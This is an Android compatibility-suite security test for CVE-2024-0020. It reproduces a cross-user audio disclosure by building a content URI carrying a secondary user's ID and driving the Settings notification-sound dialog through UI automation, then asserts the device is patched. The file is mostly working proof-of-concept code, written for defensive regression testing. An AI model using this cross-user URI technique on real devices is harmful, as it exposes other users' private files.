/*
 * Copyright (C) 2024 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2024_0020;

import static android.Manifest.permission.CREATE_USERS;
import static android.provider.Settings.ACTION_CHANNEL_NOTIFICATION_SETTINGS;
import static android.provider.Settings.EXTRA_APP_PACKAGE;
import static android.provider.Settings.EXTRA_CHANNEL_ID;
import static android.provider.Settings.System.NOTIFICATION_SOUND;

import static androidx.test.platform.app.InstrumentationRegistry.getInstrumentation;

import static com.android.compatibility.common.util.SystemUtil.runShellCommand;
import static com.android.compatibility.common.util.SystemUtil.runWithShellPermissionIdentity;
import static com.android.sts.common.SystemUtil.poll;

import static com.google.common.truth.Truth.assertWithMessage;
import static com.google.common.truth.TruthJUnit.assume;

import android.app.Instrumentation;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.UserInfo;
import android.net.Uri;
import android.os.Build;
import android.os.UserManager;

import androidx.test.runner.AndroidJUnit4;
import androidx.test.uiautomator.By;
import androidx.test.uiautomator.BySelector;
import androidx.test.uiautomator.UiDevice;
import androidx.test.uiautomator.UiObject2;
import androidx.test.uiautomator.UiScrollable;
import androidx.test.uiautomator.UiSelector;
import androidx.test.uiautomator.Until;

import org.junit.Test;
import org.junit.runner.RunWith;

import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@RunWith(AndroidJUnit4.class)
public class DeviceTest {
    private final long TIMEOUT_MS = 5_000L;

    @Test
    public void testPocCVE_2024_0020() {
        UiDevice uiDevice = null;
        try {
            final Instrumentation instrumentation = getInstrumentation();
            final Context context = instrumentation.getContext();
            final UserManager userManager = context.getSystemService(UserManager.class);

            // Check if the device supports multiple users or not
            assume().withMessage("This device does not support multiple users")
                    .that(userManager.supportsMultipleUsers())
                    .isTrue();

            // Get the user id of 'cve_2024_0020_user'
            final int testUserId =
                    runWithShellPermissionIdentity(
                            () -> {
                                List<UserInfo> list = userManager.getUsers();
                                for (UserInfo info : list) {
                                    if (info.toString().contains("cve_2024_0020_user")) {
                                        return info.getUserHandle().getIdentifier();
                                    }
                                }
                                return -1;
                            },
                            CREATE_USERS);
            assume().withMessage("Unable to get userId of secondary user")
                    .that(testUserId)
                    .isNotEqualTo(-1);

            // Build URI for 'vulnerableFileUri'
            final String currentPackageName = context.getPackageName();
            final String vulnerableNotificationSoundName = "CVE_2024_0020.mp3";
            final Uri vulnerableFileUri =
                    withUserId(Uri.parse("content://" + currentPackageName), testUserId)
                            .buildUpon()
                            .appendPath(vulnerableNotificationSoundName)
                            .build();

            // Set shared preference to fetch 'vulnerableFileUri' in PocActivity to reproduce issue
            context.getSharedPreferences(currentPackageName, Context.MODE_PRIVATE)
                    .edit()
                    .putString("vulnerableFileUri", vulnerableFileUri.toString())
                    .commit();

            // Create notification channel
            final String channelId = "cve_2024_0020_channel_id";
            NotificationManager notificationManager =
                    context.getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(
                    new NotificationChannel(
                            channelId /* channelId */,
                            "cve_2024_0020_notification_channel_name" /* channelName */,
                            NotificationManager.IMPORTANCE_HIGH));

            // Launch 'ChannelPanelActivity' which opens a dialog for
            // controlling notification channel settings
            String extraChannelFilterList =
                    (Build.VERSION.SDK_INT > Build.VERSION_CODES.R)
                            ? android.provider.Settings.class
                                    .getField("EXTRA_CHANNEL_FILTER_LIST")
                                    .get(null)
                                    .toString()
                            : "android.provider.extra.CHANNEL_FILTER_LIST";
            Intent intent =
                    new Intent(ACTION_CHANNEL_NOTIFICATION_SETTINGS)
                            .putExtra(EXTRA_APP_PACKAGE, currentPackageName)
                            .putExtra(EXTRA_CHANNEL_ID, channelId)
                            .putExtra(extraChannelFilterList, NOTIFICATION_SOUND)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

            // Wait for activity to be launched
            assume().that(
                            checkActivityLaunched(
                                    intent.resolveActivity(context.getPackageManager())
                                            .flattenToString()))
                    .isTrue();

            // UI is different on Android 11, so additional click is required
            uiDevice = UiDevice.getInstance(instrumentation);
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.R) {
                assume().that(clickUiObject(uiDevice, By.text("Advanced"))).isTrue();
            }

            // Scroll until text 'Sound' is visible
            String settingsPackageName =
                    intent.resolveActivity(context.getPackageManager()).getPackageName();
            Context settingsContext =
                    context.createPackageContext(
                            settingsPackageName, Context.CONTEXT_IGNORE_SECURITY);
            String text =
                    settingsContext.getString(
                            settingsContext
                                    .getPackageManager()
                                    .getResourcesForApplication(settingsPackageName)
                                    .getIdentifier(
                                            "notification_channel_sound_title",
                                            "string",
                                            settingsPackageName));
            UiScrollable uiScrollable = new UiScrollable(new UiSelector().scrollable(true));
            uiScrollable.scrollTextIntoView(text);

            // Click UI Objects to reproduce the issue
            assume().withMessage("Failed to click UI Object correspond to 'Sound'")
                    .that(clickUiObject(uiDevice, By.text(text)))
                    .isTrue();
            assume().withMessage(
                            "Failed to click UI Object correspond to"
                                    + " 'android.security.cts.CVE_2024_0020'")
                    .that(clickUiObject(uiDevice, By.text(currentPackageName)))
                    .isTrue();

            // By clicking 'Always', 'PocActivity' gets started which further tries to set
            // notification sound with 'vulnerableFileUri'
            assume().withMessage("Failed to click UI Object correspond to 'Always'")
                    .that(clickUiObject(uiDevice, By.res("android:id/button_always")))
                    .isTrue();

            // Without Fix, an audio file corresponding to a secondary user is set as a notification
            // sound and the UI contains UiObject corresponding to vulnerableNotificationSoundName
            assertWithMessage(
                            "Device is vulnerable to b/299614635 !!"
                                    + " Audios can be revealed across users via"
                                    + " com.android.settings.notification"
                                    + ".app.NotificationSoundPreference")
                    .that(
                            uiDevice.wait(
                                    Until.findObject(
                                            By.textContains(vulnerableNotificationSoundName)),
                                    TIMEOUT_MS))
                    .isNull();
        } catch (Exception e) {
            assume().that(e).isNull();
        } finally {
            try {
                // Exit the test gracefully
                uiDevice.pressHome();
            } catch (Exception ignore) {
                // Ignore
            }
        }
    }

    private Uri withUserId(Uri uri, int userId) {
        Uri.Builder builder = uri.buildUpon();
        builder.encodedAuthority(userId + "@" + uri.getEncodedAuthority());
        return builder.build();
    }

    private boolean clickUiObject(UiDevice uiDevice, BySelector selector) throws Exception {
        boolean objectFound = uiDevice.wait(Until.hasObject(selector), TIMEOUT_MS);
        if (objectFound) {
            UiObject2 uiobject = uiDevice.findObject(selector);
            poll(() -> (uiobject.isEnabled()));
            uiobject.click();
        }
        return objectFound;
    }

    private boolean checkActivityLaunched(String activityName) throws Exception {
        final Pattern resumedPattern =
                Pattern.compile("mResumed=(?<value>(true|false))", Pattern.CASE_INSENSITIVE);
        return poll(
                () -> {
                    String dumpsys =
                            runShellCommand(String.format("dumpsys activity " + activityName));
                    Matcher matcher = resumedPattern.matcher(dumpsys);
                    if (matcher.find() && matcher.group("value").equals("true")) {
                        return true;
                    }
                    return false;
                });
    }
}
